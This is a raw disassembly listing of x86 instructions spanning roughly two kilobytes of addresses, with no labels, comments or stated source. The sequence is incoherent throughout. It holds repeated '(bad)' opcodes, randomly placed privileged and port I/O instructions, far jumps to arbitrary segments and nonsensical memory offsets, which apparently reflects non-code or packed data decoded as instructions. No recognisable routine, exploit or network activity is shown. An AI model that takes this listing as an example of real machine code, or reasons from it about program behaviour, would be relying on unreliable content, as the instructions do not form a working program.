  41872b:	mov    ds:0xb1f09485,al
  418730:	stc    
  418731:	test   al,0xe7
  418733:	je     0x41875f
  418735:	xor    DWORD PTR [eax-0x58],ecx
  418738:	or     DWORD PTR [eax+0x2ea2c901],edi
  41873e:	adc    al,0x3
  418740:	outs   dx,BYTE PTR ds:[esi]
  418741:	xor    al,0x1b
  418743:	mov    ebx,0xdfa37806
  418748:	fild   WORD PTR [esi+0x6a06d02b]
  41874e:	jmp    0x41873c
  418750:	ins    DWORD PTR es:[edi],dx
  418751:	add    ecx,DWORD PTR [edx+0x5a]
  418754:	xor    BYTE PTR [eax+0xd],ah
  418757:	mov    dl,0x49
  418759:	lds    ebx,FWORD PTR [esi-0x22]
  41875c:	pop    eax
  41875d:	jns    0x418784
  41875f:	test   BYTE PTR [esi-0x37ff2bae],cl
  418765:	hlt    
  418766:	fcomp  QWORD PTR [ebx-0x55405fc]
  41876c:	push   edx
  41876d:	lea    edx,[edi-0x2f]
  418770:	dec    esp
  418771:	pop    ecx
  418772:	mov    al,0x32
  418774:	push   edi
  418775:	mov    ch,0x51
  418777:	adc    dl,al
  418779:	stos   BYTE PTR es:[edi],al
  41877a:	jne    0x418709
  41877c:	mov    edi,DWORD PTR [ebx]
  41877e:	inc    DWORD PTR [edx+0x74]
  418781:	sbb    esi,DWORD PTR [edi+0x31509bf8]
  418787:	push   cs
  418788:	pop    esi
  418789:	fcomp  DWORD PTR [ebp-0x7e]
  41878c:	xchg   esp,eax
  41878d:	scas   eax,DWORD PTR es:[edi]
  41878e:	imul   BYTE PTR [edi+0x43b48131]
  418794:	xor    ecx,DWORD PTR [ebp+edx*1+0x4e759dfa]
  41879b:	(bad)  
  41879c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41879d:	sub    esp,DWORD PTR [eax]
  41879f:	mov    ecx,0x9a8866c3
  4187a4:	loope  0x418799
  4187a6:	pushf  
  4187a7:	dec    edx
  4187a8:	add    al,0xe8
  4187aa:	and    ah,bh
  4187ac:	sub    DWORD PTR [ecx],esi
  4187ae:	cwde   
  4187af:	(bad)  
  4187b0:	or     al,0xa7
  4187b2:	xchg   edi,eax
  4187b3:	mov    bl,0xb5
  4187b5:	ret    
  4187b6:	add    al,0xf5
  4187b8:	dec    edi
  4187b9:	dec    edi
  4187ba:	fwait
  4187bb:	xchg   ebx,eax
  4187bc:	add    al,0xe0
  4187be:	cs ins BYTE PTR es:[edi],dx
  4187c0:	push   edx
  4187c1:	out    dx,al
  4187c2:	adc    ebp,0xa05d72da
  4187c8:	xor    BYTE PTR [edi+0x4e9ca15c],ah
  4187ce:	fld    TBYTE PTR [ebx+0x383bba53]
  4187d4:	mov    ebx,0xaf26c3bd
  4187d9:	xor    eax,0xabc37d42
  4187df:	jnp    0x418832
  4187e1:	inc    ecx
  4187e2:	push   cs
  4187e3:	add    eax,DWORD PTR [ecx-0x3]
  4187e6:	or     al,0xe5
  4187e8:	jl     0x4187d1
  4187ea:	mov    edi,0xb17e16a6
  4187ef:	xchg   ebx,eax
  4187f0:	retf   0xe2ed
  4187f3:	loope  0x41884e
  4187f5:	sbb    DWORD PTR [edx-0x48907613],ebx
  4187fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187fc:	sti    
  4187fd:	sub    dl,ch
  4187ff:	setno  BYTE PTR [ebx-0x61c7c9d1]
  418806:	dec    esp
  418807:	or     DWORD PTR [eax+0x7be5134d],eax
  41880d:	leave  
  41880e:	call   0xe5fcc8e0
  418813:	lds    esp,FWORD PTR [ebp-0x6d]
  418816:	push   cs
  418817:	loopne 0x418869
  418819:	sub    cl,BYTE PTR es:[edx]
  41881c:	pop    ds
  41881d:	stos   DWORD PTR es:[edi],eax
  41881e:	bnd jge 0x41881a
  418821:	sbb    edx,DWORD PTR [edx-0x1bb8e0da]
  418827:	jmp    0x24ec:0xb67a6dec
  41882e:	push   esp
  41882f:	sbb    eax,0xaa3252a0
  418834:	int    0x27
  418836:	in     al,0x1e
  418838:	push   DWORD PTR [edi+0x7a]
  41883b:	cmp    ecx,esi
  41883d:	mov    ds:0x81cc1bef,eax
  418842:	push   edx
  418843:	dec    ebp
  418844:	and    dh,BYTE PTR [ebx+0x66a70892]
  41884a:	lock pop esp
  41884c:	fstp   QWORD PTR [edx+0x77d8472f]
  418852:	leave  
  418853:	aas    
  418854:	push   eax
  418855:	sbb    ah,BYTE PTR [edx]
  418857:	cli    
  418858:	mov    eax,0x10ed4498
  41885d:	(bad)  
  41885e:	and    al,0x7b
  418860:	pop    edi
  418861:	jb     0x4188c8
  418863:	pop    ebp
  418864:	sub    DWORD PTR [ebx],edx
  418866:	gs jl  0x41886f
  418869:	cmp    DWORD PTR [eax-0x75],0x5b61789b
  418870:	das    
  418871:	sbb    BYTE PTR [edx+0x79b806f9],cl
  418877:	iret   
  418878:	sti    
  418879:	fimul  WORD PTR [edx]
  41887b:	bound  edi,QWORD PTR [ebx]
  41887d:	sbb    dl,ch
  41887f:	mov    ch,BYTE PTR [ebx+0x4f79131b]
  418885:	imul   esp,DWORD PTR [edi+0x60],0x425f9368
  41888c:	shl    cl,0x1e
  41888f:	cmp    BYTE PTR [edi-0x26],0xa4
  418893:	jbe    0x41885d
  418895:	xlat   BYTE PTR ds:[ebx]
  418896:	or     al,BYTE PTR [edi-0x17]
  418899:	cmp    al,0x29
  41889b:	jg     0x418852
  41889d:	sub    esi,DWORD PTR [eax]
  41889f:	mov    ebx,0xee72648
  4188a4:	iret   
  4188a5:	in     al,dx
  4188a6:	repz cld 
  4188a8:	rol    BYTE PTR [edx-0x25a55aec],cl
  4188ae:	sbb    BYTE PTR [edx+0x1001907d],bl
  4188b4:	retf   
  4188b5:	dec    edi
  4188b6:	or     al,0x1b
  4188b8:	fsubp  st(1),st
  4188ba:	(bad)
  4188be:	adc    DWORD PTR [eax-0x351cedb],edx
  4188c4:	out    dx,al
  4188c5:	mov    ds:0xe6c9dd8,eax
  4188ca:	mov    edx,0xd6d9d42f
  4188cf:	(bad)  
  4188d0:	repnz mov BYTE PTR [ecx-0x7e681fab],cl
  4188d7:	out    0x7c,al
  4188d9:	add    DWORD PTR [edx],esp
  4188db:	push   cs
  4188dc:	sbb    al,0x81
  4188de:	ret    0xd7d0
  4188e1:	xlat   BYTE PTR ds:[ebx]
  4188e2:	push   ebx
  4188e3:	jmp    0xa19a:0x40d8daaa
  4188ea:	out    0xda,eax
  4188ec:	xchg   DWORD PTR [esi-0x4df117d7],ebx
  4188f2:	push   edx
  4188f3:	sub    eax,0xd38ceff8
  4188f8:	mov    DWORD PTR [edi],eax
  4188fa:	push   edi
  4188fb:	mov    ebp,0xc5995de7
  418900:	sbb    DWORD PTR [eax],ecx
  418902:	cdq    
  418903:	retf   0x468f
  418906:	hlt    
  418907:	pop    esi
  418908:	(bad)  
  418909:	jmp    0xd425:0x819afef7
  418910:	xor    eax,0x55d25d6f
  418915:	push   ds
  418916:	mov    WORD PTR [ecx],ss
  418918:	inc    ebx
  418919:	mov    ebp,0xf4a9dd7f
  41891e:	jne    0x4188ab
  418920:	cmp    eax,0x9d52fbfc
  418925:	bound  ebx,QWORD PTR [ecx]
  418927:	test   eax,0xb35fcabc
  41892c:	xchg   edx,eax
  41892d:	sub    BYTE PTR [ebp+0x6257adf1],0x78
  418934:	not    cl
  418936:	in     al,dx
  418937:	(bad)  
  418938:	jbe    0x4189a2
  41893a:	imul   esi,DWORD PTR [edx-0xa],0xf
  41893e:	repz jno 0x41897b
  418941:	iret   
  418942:	dec    ecx
  418943:	addr16 adc eax,0xe6b659ec
  418949:	stos   DWORD PTR es:[edi],eax
  41894a:	ja     0x4189ca
  41894c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41894d:	adc    eax,0xb6c0dcb2
  418952:	xchg   esp,eax
  418954:	fwait
  418955:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418956:	inc    esi
  418957:	mov    bl,0x61
  418959:	hlt    
  41895a:	mov    WORD PTR [edi+0x32b6720f],gs
  418960:	add    DWORD PTR [eax-0x50bcf83],edi
  418966:	or     edx,DWORD PTR [esi]
  418968:	and    dl,BYTE PTR [esi-0x1f]
  41896b:	sbb    edx,edi
  41896d:	retf   0xf484
  418970:	xor    al,0xb6
  418972:	adc    eax,esp
  418974:	push   cs
  418975:	ins    BYTE PTR es:[edi],dx
  418976:	dec    ecx
  418977:	mul    BYTE PTR [esi+ebp*4+0x6d]
  41897b:	push   esp
  41897c:	call   DWORD PTR [esi+0x60]
  41897f:	jmp    0x77b7:0x69a0a4b0
  418986:	pop    eax
  418987:	fwait
  418988:	std    
  418989:	out    dx,al
  41898a:	pop    esi
  41898b:	jecxz  0x418944
  41898d:	fwait
  41898e:	dec    edi
  41898f:	pop    es
  418990:	dec    eax
  418991:	push   esp
  418992:	jmp    0x5ab2902c
  418997:	icebp  
  418998:	imul   eax,DWORD PTR [edx+0x2a],0x1e15ccfe
  41899f:	outs   dx,DWORD PTR ds:[esi]
  4189a0:	push   esi
  4189a1:	xchg   esi,eax
  4189a2:	ds out dx,eax
  4189a4:	arpl   WORD PTR [edx+0x71],dx
  4189a7:	repz (bad) 
  4189a9:	into   
  4189aa:	(bad)  
  4189ab:	cmc    
  4189ac:	cld    
  4189ad:	stos   BYTE PTR es:[edi],al
  4189ae:	fdivr  DWORD PTR [ecx]
  4189b0:	into   
  4189b1:	or     DWORD PTR [ecx-0x58],ebx
  4189b4:	mov    ebx,DWORD PTR [edi-0x42]
  4189b7:	out    dx,al
  4189b8:	enter  0x5cd7,0xb3
  4189bc:	xchg   esp,eax
  4189bd:	xchg   edi,eax
  4189be:	push   ebp
  4189bf:	aam    0x17
  4189c1:	jne    0x4189e3
  4189c3:	enter  0x24ce,0xb4
  4189c7:	jae    0x418a31
  4189c9:	in     al,0x27
  4189cb:	(bad)  
  4189cc:	inc    esi
  4189cd:	ins    DWORD PTR es:[edi],dx
  4189ce:	aam    0x4c
  4189d0:	xor    DWORD PTR [ebp+0x5],esi
  4189d3:	inc    edx
  4189d4:	cmp    al,0x9c
  4189d6:	cmp    bh,dh
  4189d8:	rol    BYTE PTR [edi-0x27],cl
  4189db:	fwait
  4189dc:	shr    DWORD PTR [ecx-0x68cbc48e],0xc
  4189e3:	sub    DWORD PTR [eax-0x4eb12f42],0xed76099b
  4189ed:	fidivr WORD PTR [ebp+0x7e007af8]
  4189f3:	add    edi,DWORD PTR [ebp-0x1e3b5c11]
  4189f9:	push   ds
  4189fa:	mov    eax,0x514c537
  4189ff:	pop    ss
  418a00:	adc    BYTE PTR [ecx],0x49
  418a03:	or     esi,DWORD PTR [esi]
  418a05:	pop    ebp
  418a06:	aas    
  418a07:	inc    edi
  418a08:	ja     0x418a88
  418a0a:	jge    0x4189bf
  418a0c:	push   es
  418a0d:	cmp    esp,ebx
  418a0f:	mov    bl,0xda
  418a11:	popa   
  418a12:	sub    ch,BYTE PTR [eax]
  418a14:	stos   DWORD PTR es:[edi],eax
  418a15:	ins    BYTE PTR es:[edi],dx
  418a16:	stmxcsr DWORD PTR [edx+0x6a25f5ca]
  418a1d:	ficomp WORD PTR [ecx-0x3d7d16a3]
  418a23:	loope  0x418a16
  418a25:	bound  esi,QWORD PTR [ecx+0x63cc4a23]
  418a2b:	mov    ds:0x7237f0f6,eax
  418a30:	push   eax
  418a31:	mov    ebp,ebp
  418a33:	add    eax,0x7fee0e5a
  418a38:	push   esp
  418a39:	loope  0x418a26
  418a3b:	mov    esp,0x42c7d7f1
  418a40:	mov    eax,0xf773f6db
  418a45:	jmp    0x60c66fae
  418a4a:	push   ecx
  418a4b:	inc    eax
  418a4c:	or     BYTE PTR [ebx+ecx*8+0x40c38e24],bl
  418a53:	cmc    
  418a54:	mov    WORD PTR [esi-0x6f],fs
  418a57:	jbe    0x418a80
  418a59:	mov    bh,0x33
  418a5b:	lods   eax,DWORD PTR ds:[esi]
  418a5c:	sar    bh,0x58
  418a5f:	mov    al,0xf6
  418a61:	cvtps2pd xmm5,QWORD PTR ds:0xfe5a125b
  418a68:	jne    0x4189f4
  418a6a:	iret   
  418a6b:	stc    
  418a6c:	xchg   BYTE PTR [edi-0x10],bl
  418a6f:	lea    ebp,[eax+0x49550241]
  418a75:	adc    DWORD PTR [edi-0x45250746],0x1e161f9f
  418a7f:	aad    0x3e
  418a81:	adc    esp,DWORD PTR [eax+0x65db2f6]
  418a87:	jp     0x418ab3
  418a89:	cmp    BYTE PTR [edx-0x15433551],dh
  418a8f:	je     0x418a5b
  418a91:	mov    dh,0x8b
  418a93:	shr    BYTE PTR [esi-0x53],cl
  418a96:	push   0x26a41e5
  418a9b:	test   DWORD PTR fs:[ebx+ecx*2+0x20c47460],0x20f1b8b
  418aa7:	pop    ds
  418aa8:	mov    bh,0xa3
  418aaa:	sahf   
  418aab:	lgs    ebp,FWORD PTR [eax-0x77430515]
  418ab2:	push   ds
  418ab3:	sbb    eax,0xd177671b
  418ab8:	dec    esi
  418ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418aba:	(bad)  
  418abb:	inc    edi
  418abc:	mov    ds:0x7884a7e5,eax
  418ac1:	jno    0x418a5f
  418ac3:	cli    
  418ac4:	outs   dx,DWORD PTR fs:[esi]
  418ac6:	imul   edi,DWORD PTR [eax+0x2d],0xffffffaf
  418aca:	xchg   edx,eax
  418acb:	(bad)  
  418acc:	(bad)  
  418acd:	loop   0x418aff
  418acf:	rcl    DWORD PTR [edx-0x1c810624],1
  418ad5:	das    
  418ad6:	jmp    0x426df60e
  418adb:	sub    eax,0x36c2e4e4
  418ae0:	shl    DWORD PTR [eax],1
  418ae2:	scas   eax,DWORD PTR es:[edi]
  418ae3:	jge    0x418a7e
  418ae5:	add    eax,ebx
  418ae7:	mov    dh,0x6f
  418ae9:	aaa    
  418aea:	xchg   ebx,eax
  418aeb:	pop    edx
  418aec:	jns    0x418a73
  418aee:	pop    esi
  418aef:	les    ebp,FWORD PTR [esi+ebx*2]
  418af2:	out    0xcd,al
  418af4:	(bad)  
  418af5:	int3   
  418af6:	rcr    BYTE PTR [ecx],0x44
  418af9:	sub    eax,0x4ae2bd42
  418afe:	jl     0x418ad2
  418b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b01:	jnp    0x418a94
  418b03:	mov    ds:0xb7bdd50,al
  418b08:	adc    eax,0xcbdb88d8
  418b0d:	pusha  
  418b0e:	push   cs
  418b0f:	cmp    ebx,0x9
  418b12:	mov    cl,0x50
  418b14:	nop
  418b15:	and    al,0xa3
  418b17:	ins    DWORD PTR es:[edi],dx
  418b18:	jb     0x418b78
  418b1a:	jnp    0x418b7e
  418b1c:	dec    esp
  418b1d:	test   DWORD PTR [edi+0x50],ecx
  418b20:	inc    edi
  418b21:	inc    ecx
  418b22:	mov    ds:0xad860664,eax
  418b27:	mov    ds:0xb79a5ce4,al
  418b2c:	lock icebp 
  418b2e:	add    eax,0xf5955dd3
  418b33:	mov    esp,0x28545736
  418b38:	pop    ds
  418b39:	test   eax,0x7e444fa7
  418b3e:	xchg   ebp,eax
  418b3f:	cmp    al,0x9b
  418b41:	and    esi,DWORD PTR [ecx]
  418b43:	xchg   ecx,eax
  418b44:	repz dec eax
  418b46:	mov    ch,0xdf
  418b48:	mov    ds:0x369d188,eax
  418b4d:	lock and edi,0xa528523d
  418b54:	mov    BYTE PTR [edx],cl
  418b56:	outs   dx,BYTE PTR ds:[esi]
  418b57:	sub    esi,ecx
  418b59:	test   eax,0x62ec9b28
  418b5e:	jg     0x418b76
  418b60:	je     0x418b50
  418b62:	aad    0xa
  418b64:	pop    ecx
  418b65:	aas    
  418b66:	jp     0x418bd2
  418b68:	add    BYTE PTR [eax+0x5f0d93ed],dl
  418b6e:	add    bl,BYTE PTR [ebp+ebx*4+0x18de991e]
  418b75:	push   ecx
  418b76:	je     0x418bc0
  418b78:	retf   0x37af
  418b7b:	xchg   ebx,eax
  418b7c:	push   ss
  418b7d:	out    0xbe,eax
  418b7f:	retf   0xc4e
  418b82:	xor    ch,BYTE PTR [eax+0x4c]
  418b85:	cld    
  418b86:	shr    DWORD PTR [edi],cl
  418b88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b89:	mov    edi,cs
  418b8b:	iret   
  418b8c:	(bad)  
  418b8d:	or     BYTE PTR [ebx],dl
  418b8f:	stos   BYTE PTR es:[edi],al
  418b90:	cmp    BYTE PTR [ebx-0x11b11715],0x72
  418b97:	or     eax,0x6dffac3e
  418b9c:	shl    DWORD PTR [eax-0x3a8066a6],1
  418ba2:	repnz (bad) 
  418ba4:	mov    cs,WORD PTR [esi-0x1aae476b]
  418baa:	repz addr16 jp 0x418b95
  418bae:	out    dx,eax
  418baf:	out    0xd9,al
  418bb1:	dec    edi
  418bb2:	jp     0x418bb7
  418bb4:	in     al,0xae
  418bb6:	loop   0x418b77
  418bb8:	shl    BYTE PTR [ecx+0x6d],cl
  418bbb:	ffreep st(1)
  418bbd:	jge    0x418bab
  418bbf:	fidiv  DWORD PTR [ecx+0x27]
  418bc2:	dec    esp
  418bc3:	enter  0x7360,0x83
  418bc7:	out    0x17,eax
  418bc9:	xor    al,0x29
  418bcb:	or     esp,ebp
  418bcd:	addr16 cs or eax,0x29ec209e
  418bd4:	jp     0x418c12
  418bd6:	xchg   BYTE PTR [ebx-0x57],bh
  418bd9:	sbb    DWORD PTR [eax-0x77],eax
  418bdc:	mov    ecx,0x7d4c4da2
  418be1:	stc    
  418be2:	addr16 jo 0x418bae
  418be5:	ficomp DWORD PTR [esi+0x49]
  418be8:	arpl   WORD PTR [edi-0x41],ax
  418beb:	jmp    0x418c34
  418bed:	aad    0xc9
  418bef:	jbe    0x418c14
  418bf1:	push   esi
  418bf2:	mov    edx,0x81a469e
  418bf7:	mov    ah,0xd6
  418bf9:	retf   
  418bfa:	int3   
  418bfb:	cmp    edx,ebx
  418bfd:	shl    BYTE PTR [esi-0x37ff96fe],0xa9
  418c04:	cli    
  418c05:	or     al,0xfc
  418c07:	sbb    al,0x7f
  418c09:	outs   dx,BYTE PTR ds:[esi]
  418c0a:	or     BYTE PTR [edx],cl
  418c0c:	dec    ebp
  418c0d:	dec    esi
  418c0e:	xor    ebx,DWORD PTR [edx+0x16bcbb30]
  418c14:	inc    edx
  418c15:	fcmovnb st,st(4)
  418c17:	jns    0x418c52
  418c19:	(bad)  
  418c1a:	xor    ebx,DWORD PTR [edi+ecx*1+0x375b2dda]
  418c21:	idiv   DWORD PTR [eax]
  418c23:	in     al,0x28
  418c25:	sub    BYTE PTR [eax+ecx*1],ch
  418c28:	fdiv   QWORD PTR [edx-0x2f1a04e]
  418c2e:	cmp    BYTE PTR [ecx+eiz*4+0x56c3f20c],dh
  418c35:	or     esi,esp
  418c37:	add    eax,0xb977e83c
  418c3d:	cmp    ebp,DWORD PTR [eax+0x9bd0b1e]
  418c43:	adc    bh,bh
  418c45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c46:	add    al,0xdc
  418c48:	into   
  418c49:	or     eax,DWORD PTR [ecx+0x7c910521]
  418c4f:	jns    0x418c1e
  418c51:	sub    al,ch
  418c53:	mov    ecx,DWORD PTR [ebp+0x1b]
  418c56:	xchg   DWORD PTR [edx+0x38a62d27],eax
  418c5c:	and    al,BYTE PTR [ebx+0x50]
  418c5f:	mov    DWORD PTR [eax],ecx
  418c61:	cmc    
  418c62:	and    ebx,eax
  418c64:	xlat   BYTE PTR ds:[ebx]
  418c65:	adc    eax,DWORD PTR [ebx+0x39]
  418c68:	mov    edi,DWORD PTR [eax+edi*2-0x654fc316]
  418c6f:	cmp    ecx,DWORD PTR [ebp+0x67722501]
  418c75:	out    0x60,eax
  418c77:	add    BYTE PTR [ebx+edi*1+0x2be46703],0x99
  418c7f:	mov    esp,0xcec13861
  418c84:	inc    edi
  418c85:	std    
  418c86:	cld    
  418c87:	mov    edi,0x95a921a7
  418c8c:	pop    ecx
  418c8d:	int3   
  418c8e:	sbb    DWORD PTR [ebp+0x1d3ff62b],esp
  418c94:	jmp    0x418c22
  418c96:	popa   
  418c97:	mov    dh,0x4a
  418c99:	popa   
  418c9a:	pop    esp
  418c9b:	push   ds
  418c9c:	fild   QWORD PTR [si-0x4a]
  418ca0:	jcxz   0x418c35
  418ca3:	mov    dl,0x8e
  418ca5:	daa    
  418ca6:	test   BYTE PTR [esi-0x7b],al
  418ca9:	add    DWORD PTR [ebx+0x71c86b0b],edi
  418caf:	inc    edx
  418cb0:	lahf   
  418cb1:	out    0xf8,al
  418cb3:	lock scas eax,DWORD PTR es:[edi]
  418cb5:	ds stos DWORD PTR es:[edi],eax
  418cb7:	jo     0x418cf0
  418cb9:	xchg   ebx,eax
  418cba:	lahf   
  418cbb:	and    DWORD PTR [eax+ecx*1-0x32],ecx
  418cbf:	leave  
  418cc0:	mov    al,ds:0xcaf95c26
  418cc5:	test   eax,0xec66e377
  418cca:	std    
  418ccb:	xchg   esi,eax
  418ccc:	jbe    0x418d22
  418cce:	hlt    
  418ccf:	repnz pushf 
  418cd1:	push   ebp
  418cd2:	outs   dx,DWORD PTR ds:[esi]
  418cd3:	loope  0x418cf4
  418cd5:	imul   edi,DWORD PTR [eax+eiz*1-0x40b14b2a],0xffffff99
  418cdd:	dec    ebx
  418cde:	ja     0x418c6e
  418ce0:	sub    esp,esi
  418ce2:	(bad)  
  418ce4:	daa    
  418ce5:	ror    BYTE PTR [edi-0x20],1
  418ce8:	adc    DWORD PTR [ebp+0x63e0934a],esi
  418cee:	outs   dx,BYTE PTR ds:[esi]
  418cef:	imul   esp,DWORD PTR [eax],0xc4652e73
  418cf5:	pop    ebx
  418cf6:	mov    ecx,0xe1c3c350
  418cfb:	adc    cl,BYTE PTR ds:0x4fc613f7
  418d01:	push   es
  418d02:	fisubr WORD PTR [ecx-0x2c]
  418d05:	sub    edx,esp
  418d07:	cwde   
  418d08:	jl     0x418d42
  418d0a:	jbe    0x418d30
  418d0c:	enter  0x7ed,0x97
  418d10:	into   
  418d11:	mov    DWORD PTR [esp+ebx*1],ebx
  418d14:	addr16 pop ss
  418d16:	pushf  
  418d17:	dec    eax
  418d18:	ror    DWORD PTR [edx+0x52a20f4a],cl
  418d1e:	inc    esi
  418d1f:	add    DWORD PTR [ecx-0x5813f728],esi
  418d25:	mov    ebx,DWORD PTR [eax+edx*1]
  418d28:	cmp    al,0x77
  418d2a:	xor    DWORD PTR [esi-0x5b],edi
  418d2d:	dec    ebx
  418d2e:	sub    eax,0x2335574e
  418d33:	inc    ecx
  418d34:	mov    esi,0xe8c2d300
  418d39:	stos   BYTE PTR es:[edi],al
  418d3a:	jle    0x418d87
  418d3c:	jno    0x418d07
  418d3e:	stos   BYTE PTR es:[edi],al
  418d3f:	sub    DWORD PTR [ebx-0xb73942f],0xffffffcc
  418d46:	pop    ebp
  418d47:	adc    al,BYTE PTR [edi-0x21]
  418d4a:	outs   dx,BYTE PTR ds:[esi]
  418d4b:	mov    ss,WORD PTR [ecx-0x23]
  418d4e:	xchg   esi,eax
  418d4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d50:	jmp    0xe9db816f
  418d55:	push   cs
  418d56:	idiv   BYTE PTR [ebx+edx*8]
  418d59:	sbb    BYTE PTR [edi-0x40437955],bl
  418d5f:	push   ecx
  418d60:	lahf   
  418d61:	in     al,dx
  418d62:	pop    ds
  418d63:	repz dec esp
  418d65:	push   esi
  418d66:	mov    dl,0xea
  418d68:	push   eax
  418d69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d6a:	inc    esp
  418d6b:	dec    eax
  418d6c:	gs dec ecx
  418d6e:	js     0x418da4
  418d70:	pop    ss
  418d71:	xchg   esp,eax
  418d72:	dec    ecx
  418d73:	data16 jne 0x418db3
  418d76:	pop    esp
  418d77:	or     DWORD PTR [eax+eax*4],ebp
  418d7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d7b:	test   DWORD PTR [ebp+0x8],eax
  418d7e:	in     eax,dx
  418d7f:	aad    0x89
  418d81:	or     DWORD PTR ds:0x28fc2cd3,ebp
  418d87:	jne    0x418dfb
  418d89:	addr16 dec edi
  418d8b:	in     al,0xa9
  418d8d:	xchg   esp,edx
  418d8f:	cmovne esp,eax
  418d92:	inc    esi
  418d93:	cld    
  418d94:	jb     0x418e0d
  418d96:	out    dx,eax
  418d97:	pop    ebp
  418d98:	in     al,dx
  418d99:	fbstp  TBYTE PTR [esi+0x2c]
  418d9c:	mov    dh,0x46
  418d9e:	inc    eax
  418d9f:	push   ebp
  418da0:	xor    bh,BYTE PTR [ebx]
  418da2:	(bad)  
  418da4:	or     dl,0x7c
  418da7:	in     eax,0xd7
  418da9:	sbb    eax,0xcbec42b1
  418dae:	sti    
  418daf:	adc    al,0x8a
  418db1:	cli    
  418db2:	dec    ebx
  418db3:	cld    
  418db4:	call   0x2a94:0x82ad67f9
  418dbb:	pop    ebp
  418dbc:	pop    ds
  418dbd:	cdq    
  418dbe:	mov    al,bh
  418dc0:	ror    BYTE PTR [esi],0xf9
  418dc3:	mov    BYTE PTR [edi-0x23],dl
  418dc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dc7:	sub    ch,dh
  418dc9:	rcl    BYTE PTR [esi],cl
  418dcb:	stos   DWORD PTR es:[edi],eax
  418dcc:	ror    esi,1
  418dce:	call   0xf53e1470
  418dd3:	cmp    ah,bh
  418dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418dd6:	sub    al,0xc3
  418dd8:	sub    BYTE PTR [ecx],dh
  418dda:	push   edx
  418ddb:	xor    al,BYTE PTR [ebx]
  418ddd:	cmp    dl,BYTE PTR [ebp-0x42]
  418de0:	call   0x1eaf002c
  418de5:	adc    eax,0xc86729f8
  418dea:	jle    0x418deb
  418dec:	test   eax,0x78a7f870
  418df1:	mov    dh,0x5e
  418df3:	mov    al,BYTE PTR [esi+esi*8+0x2376d1e0]
  418dfa:	ret    0xaeb
  418dfd:	test   BYTE PTR [esi+edx*4+0xe12a6c4],bh
  418e04:	mov    ebp,0x1a6efb2c
  418e09:	(bad)  
  418e0a:	inc    DWORD PTR ds:0x2bab4c47
  418e10:	add    bl,BYTE PTR [eax+0x78]
  418e13:	and    al,0xa6
  418e15:	adc    eax,0xd3ffe95e
  418e1a:	jo     0x418e68
  418e1c:	bound  edi,QWORD PTR [edx-0x586e8681]
  418e22:	data16 mov ah,0xee
  418e25:	pop    ss
  418e26:	mov    edi,0x550e2ad5
  418e2b:	mov    ebx,0x8e8699aa
  418e30:	stos   DWORD PTR es:[edi],eax
  418e31:	and    cl,BYTE PTR [ebp-0x5fbb5da2]
  418e37:	lock adc dh,BYTE PTR [esp+esi*1+0x7f]
  418e3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e3d:	jp     0x418e7a
  418e3f:	cli    
  418e40:	dec    eax
  418e41:	mov    esi,0x3e08dadd
  418e46:	sahf   
  418e47:	ror    DWORD PTR [eax+0x789b043d],0x27
  418e4e:	cmp    DWORD PTR [ecx-0x80],eax
  418e51:	(bad)  
  418e52:	stc    
  418e53:	mov    cl,0x2b
  418e55:	gs sub esi,esp
  418e58:	pop    esi
  418e59:	aaa    
  418e5a:	or     dh,ch
  418e5c:	jge    0x418de2
  418e5e:	into   
  418e5f:	ror    BYTE PTR [edi-0x11],0xb6
  418e63:	inc    ecx
  418e64:	enter  0x269e,0x43
  418e68:	iret   
  418e69:	mov    bl,0x3c
  418e6b:	push   edx
  418e6c:	loope  0x418e85
  418e6e:	inc    edx
  418e6f:	out    0x12,eax
  418e71:	(bad)  
  418e72:	adc    eax,0x384500d0
  418e77:	fimul  DWORD PTR [ebx-0x18]
  418e7a:	add    bh,BYTE PTR [eax]
  418e7c:	xchg   edx,eax
  418e7d:	cmp    bh,cl
  418e7f:	fwait
  418e80:	push   esi
  418e81:	gs sti 
  418e83:	mov    bl,0xeb
  418e85:	aad    0x7a
  418e87:	inc    esi
  418e88:	xor    eax,0x995ecbf8
  418e8d:	jecxz  0x418e98
  418e8f:	jbe    0x418e6f
  418e91:	push   ebx
  418e92:	or     BYTE PTR [ecx+esi*4],dh
  418e95:	adc    ecx,ebx
  418e97:	jbe    0x418efc
  418e99:	mov    ebx,0x584947db
  418e9e:	nop
  418e9f:	mov    ebx,0x8c69e9e9
  418ea4:	and    al,0x14
  418ea6:	and    ch,BYTE PTR [esi]
  418ea8:	mov    ds:0x715729b6,al
  418ead:	sub    ebx,DWORD PTR [edi]
  418eaf:	mov    ds:0xc6e91844,eax
  418eb4:	leave  
  418eb5:	mov    dh,0x90
  418eb7:	in     al,dx
  418eb8:	loope  0x418edb
  418eba:	ret    
  418ebb:	inc    esp
  418ebc:	add    DWORD PTR [edi],ebp
  418ebe:	jo     0x418f0a
  418ec0:	imul   ecx,esp,0xc4d64bb5
  418ec6:	push   ss
  418ec7:	mov    ecx,0xff5453ad
  418ecc:	sub    DWORD PTR [ecx-0x7d],0x7cdf6b18
  418ed3:	fucom  st(0)
  418ed5:	sub    al,0x59
  418ed7:	or     esi,DWORD PTR [ebx-0x23]
  418eda:	mov    ss,WORD PTR [edx+0x6fa7231d]
  418ee0:	inc    edx
  418ee1:	shr    BYTE PTR [ebp+0x4abf980f],0xea
  418ee8:	fwait
  418ee9:	dec    esi
  418eea:	sbb    ecx,DWORD PTR [edx-0x5e]
  418eed:	repnz icebp 
  418eef:	push   eax
  418ef0:	jbe    0x418f29
  418ef2:	loop   0x418f42
  418ef4:	fwait
  418ef5:	pop    ebx
  418ef6:	adc    DWORD PTR [edi],0xa3d8a93f
  418efc:	xor    al,0x1e
  418efe:	jp     0x418f77
  418f00:	jecxz  0x418f01
